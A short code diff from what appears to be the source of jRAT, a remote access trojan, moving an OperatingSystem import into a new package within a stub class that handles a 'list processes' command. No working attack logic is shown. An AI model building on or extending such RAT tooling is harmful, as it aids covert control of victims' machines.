@@ -3,10 +3,10 @@ package pro.jrat.stub.packets.incoming;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 
+import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.packets.outgoing.Packet20Process;
 
-import com.redpois0n.common.OperatingSystem;
 
 
 public class Packet19ListProcesses extends AbstractIncomingPacket {
